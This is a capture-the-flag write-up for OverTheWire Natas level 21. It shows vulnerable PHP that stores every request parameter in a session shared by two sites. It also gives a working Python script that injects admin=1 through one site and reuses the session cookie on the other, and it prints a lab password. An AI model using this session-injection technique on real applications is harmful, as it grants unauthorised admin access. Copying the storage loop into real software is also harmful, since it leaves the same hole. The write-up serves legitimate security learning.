This level presented two colocated sites with a shared session store. 

These sites had a fatal flaw. They contained a storage loop that writes everything that it receives to the session file:

```php
// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
```

Below in the php was a validkeys list that was purely cosmetic:

```php
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";
```

The gate if(array_key_exists("submit", $_REQUEST)) only checks for "submit" before writing any and all input to the session file. 

The exploit that I wrote does the following: injects admin=1 via the experimenter url, and carries the PHPSESSID to the main. 

```python
import requests
s = requests.Session()
s.auth = ("natas21", "BPhv63cKE1lkQl04cE5CuFTzXe15NfiH")

# Write to experimenter
exp_url = 'http://natas21-experimenter.natas.labs.overthewire.org/'
s.post(exp_url, data={'admin': '1', 'submit': 'Submit'})

# Grab the session ID from the cookie jar
session_id = s.cookies.get('PHPSESSID')

# Now carry that same ticket to the main page
main_url = 'http://natas21.natas.labs.overthewire.org/'
s.cookies.set('PHPSESSID', session_id, domain='natas21.natas.labs.overthewire.org')
print(s.get(main_url).text)
```

Initially, I was tripped up because the session ID didn't automatically cross subdomains, so I had to ensure that it persisted with s.cookies.set. 

Writing arbitrary user input to the session file is dangerous. In this case, it is particularly dangerous because one page permits user writing to session file and the second can receives this user written session file. The second page treats the edited session file as authoritative without knowing who wrote it. Ultimately, storage and trust are decoupled. One app writes, and another app trusts. Neither checks.
